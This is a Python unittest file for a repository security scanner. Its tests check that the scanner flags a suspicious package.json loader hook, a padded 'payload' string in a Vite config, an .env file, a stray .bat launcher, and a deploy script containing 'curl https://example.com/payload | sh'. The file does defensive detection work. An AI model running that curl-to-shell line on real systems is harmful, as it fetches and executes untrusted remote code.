import importlib.util
from pathlib import Path
import unittest

spec = importlib.util.spec_from_file_location('security_scan', Path(__file__).with_name('security_scan.py'))
scanner = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scanner)


class SecurityScanTest(unittest.TestCase):
    def test_rejects_loader_hook(self):
        self.assertTrue(scanner.inspect('backend/package.json', b'{"scripts":{"start":"node init && node src/server.js"}}'))

    def test_rejects_obfuscated_payload(self):
        data = ("const payload='" + 'ab' * 600 + "';").encode()
        self.assertTrue(scanner.inspect('frontend/vite.config.js', data))

    def test_rejects_remote_shell(self):
        self.assertTrue(scanner.inspect('deploy.sh', b'curl https://example.com/payload | sh'))

    def test_rejects_environment_file(self):
        self.assertTrue(scanner.inspect('backend/.env', b'EXAMPLE=value'))

    def test_rejects_unexpected_windows_launcher(self):
        self.assertTrue(scanner.inspect('config.bat', b'@echo off'))

    def test_accepts_normal_config(self):
        self.assertFalse(scanner.inspect('frontend/vite.config.js', b'export default { build: { sourcemap: false } };'))


if __name__ == '__main__':
    unittest.main()
